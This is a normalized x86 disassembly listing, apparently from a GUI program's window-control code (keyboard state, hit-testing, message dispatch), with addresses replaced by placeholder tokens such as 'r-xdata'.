mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_461dc8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_461dc8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_449b58
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46b714
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403450
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_461d0c
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403450
jmp r-xdata
sub_44b3cc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408e00
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408e2c
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_449b58
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408c44
call sub_408bb4
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408bb4
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_44b474
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_44b4a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_44b468
push ebp
call sub_44b474
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44b4f4
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_44b580
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_44b5b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44b038
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_461c7c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403450
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_461c7c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403450
sub_44b63c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_449b28
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44a1f0
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_44b5b8
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_44b688
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_449b28
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44b6a4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_449b28
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44a1f0
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44b5b8
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403450
sub_44b6fc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_44afd8
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44af6c
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44afd8
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_44b798
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44b5b8
pop esi
pop ebx
retn
sub_44b7bd
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44b5b8
pop esi
pop ebx
retn
sub_44b7e3
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44b5b8
pop esi
pop ebx
retn
sub_44b80d
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44b5b8
pop esi
pop ebx
retn
sub_44b838
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_44b868
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_44b038
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_461c7c
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403450
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_461c7c
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403450
sub_44b8e0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_44b918
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_461c7c
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403450
sub_44b950
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_44a1f0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44b918
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406e68
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403450
sub_44b9c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44b918
pop esi
pop ebx
retn
sub_44b9e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44b918
pop esi
pop ebx
retn
sub_44ba08
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_461c7c
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403450
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_455194
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44ba60
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44a1e0
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_44a1f0
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_44b16c
pop esi
retn
sub_44baa0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_44b1a0
sub_44bb4e
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_44a400
mov cl 0x1
sub_44bb90
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_44a158
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44a158
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_44bbc0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_44bbe4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406e68
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403450
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_44b16c
mov [ ebx + 0xc ] eax
sub_44bc88
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44a0ac
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44a0ac
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_44bd1c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_40319c
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_44974c
mov edx [ esp ]
mov eax esi
call sub_449728
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_4499d4
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_449a18
sub_44bda0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_419174
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_449ad0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_4191c4
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_449978
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44be2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44bd1c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_4507d8
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_44bda0
pop ecx
jmp r-xdata
sub_44be8c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44bf7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bf81
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_449fe8
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_449fb8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_449fb8
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4043b0
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403ff8
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_449ed8
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44bf88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403450
sub_44bfb4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44bfd4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44bff4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44c014
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44c034
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44c054
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44c074
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420414
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_44960c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403450
sub_44c0ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44c148
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41acac
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_4569a0
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_456ad8
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449fb8
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_456838
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_456bf8
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c14f
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_44c158
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_44c194
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_44c158
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_44c244
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4033e0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44c278
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44c298
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403450
test al al
je r-xdata
mov eax edi
call sub_44c2d8
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
